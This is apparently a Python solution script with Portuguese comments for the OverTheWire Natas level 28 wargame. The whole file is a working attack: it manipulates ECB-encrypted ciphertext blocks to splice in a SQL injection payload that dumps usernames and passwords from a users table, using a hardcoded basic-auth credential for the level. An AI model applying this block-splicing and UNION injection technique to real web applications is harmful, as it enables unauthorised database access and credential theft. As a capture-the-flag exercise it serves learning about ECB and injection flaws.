# Biblioteca para fazer requisições HTTP
import requests

# Biblioteca para codificação e decodificação Base64
import base64

# Biblioteca para colorir o texto no terminal
from termcolor import colored

####################################################################################################
# Definindo as URLs e credenciais de acesso
URL = "http://natas28.natas.labs.overthewire.org/"                          # URL base do CTF
URL_SEARCH = "http://natas28.natas.labs.overthewire.org/search.php/?query=" # URL para a busca

# Autenticacoes
AUTH_NAME = 'natas28'                           # Nome de usuário para autenticação HTTP
AUTH_PASS = '1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj'  # Senha para autenticação HTTP

# Criando uma sessão HTTP com autenticação básica
s = requests.Session()          # Cria uma sessão persistente para as requisições
s.auth = (AUTH_NAME, AUTH_PASS) # Define as credenciais de autenticação
####################################################################################################

# Função para obter o ciphertext (texto criptografado) a partir de uma query
def obter_ciphertext(query):

    # Envia a query ao servidor e retorna o ciphertext correspondente
    dados = dict(query=query)           # Cria um dicionário com a chave "query" e o valor da consulta
    resposta = s.post(URL, data=dados)  # Envia a consulta como um POST para o servidor

    # Decodificando o ciphertext da URL da resposta
    ciphertext_codificado = resposta.url.split("query=")[1]                 # Extrai o ciphertext codificado da URL
    return base64.b64decode(requests.utils.unquote(ciphertext_codificado))  # Decodifica o ciphertext

# Função para criar a SQL injection que será injetada no código
def criar_injecao_sql():

    # Retorna a SQL injection que irá extrair o nome de usuário e senha do banco de dados.
    # Retorna a SQL Injection que vai concatenar os nomes de usuário e senha
    return " UNION ALL SELECT concat(username,0x3A,password) FROM users #"

# Função para garantir que a query tenha um tamanho múltiplo de 16 bytes
def preencher_query_com_padding(nova_sql):

    # Preenche a query com padding para que seu tamanho seja múltiplo de 16 bytes.
    # Adiciona padding (A's e B's) para garantir que o comprimento seja múltiplo de 16
    return "A" * 10 + nova_sql + "B" * (16 - (len(nova_sql) % 16))

# Função principal do script (executa todo o ataque)
def executar_ataque():

    # Inicia o ataque, imprimindo informações no terminal
    print(colored("\n[INFO] Iniciando o ataque... 🌐", 'cyan', attrs=['bold']))

    # Envia a query inicial para obter o ciphertext original
    print(colored("[INFO] Enviando query inicial para obter ciphertext...", 'yellow', attrs=['bold']))
    query_inicial = "A" * 10 + "B" * 14             # Define a query de padding inicial
    ciphertext = obter_ciphertext(query_inicial)    # Obtém o ciphertext com a query inicial

    # Cria a SQL Injection para ser injetada na consulta
    nova_sql = criar_injecao_sql()

    # Cria a query com a SQL Injection e com padding para ajustá-la ao tamanho certo
    print(colored("[INFO] Criando a query com a SQL Injection... 🖥️", 'green', attrs=['bold']))
    query_completa = preencher_query_com_padding(nova_sql)

    # Envia a query com a SQL Injection e obtém o novo ciphertext
    novo_ciphertext = obter_ciphertext(query_completa)

    # Calcula o deslocamento para extrair a SQL injetada do ciphertext
    deslocamento = 48 + len(query_completa) - 10        # Ajusta o deslocamento do ciphertext
    sql_encriptada = novo_ciphertext[48:deslocamento]   # Extrai a SQL injetada do ciphertext

    # Constrói o ciphertext final misturando o original com a SQL injetada
    print(colored("[INFO] Construindo o ciphertext final com a injeção... 🔐", 'magenta', attrs=['bold']))
    ciphertext_final = ciphertext[:64] + sql_encriptada + ciphertext[64:]  # Junta o ciphertext original com a SQL injetada

    # Envia a consulta final ao servidor com o ciphertext modificado
    print(colored("[INFO] Realizando a consulta final... 🧐", 'yellow', attrs=['bold']))
    parametros = dict(query=base64.b64encode(ciphertext_final).decode('utf-8'))     # Codifica o ciphertext final em base64
    resposta = s.get(URL_SEARCH, params=parametros)                                 # Envia a consulta GET com o ciphertext final

    # Processa a resposta para buscar a flag (dados secretos)
    print(colored("[INFO] Processando resposta... 🕵️‍♂️", 'cyan', attrs=['bold']))

    # Itera sobre as linhas da resposta
    for linha in resposta.iter_lines():

        # Procura por uma string com a flag (se a flag for encontrada, exibe a mensagem com a flag)
        if "natas29" in linha.decode('utf-8'):
            print(colored("\n[RESULTADO] 💥 Flag encontrada: ", 'green') + colored(linha.decode('utf-8'), 'red', attrs=['bold', 'underline']))

# Executa o ataque quando o script é rodado
if __name__ == "__main__":

    # Chama a função principal para executar o ataque
    executar_ataque()
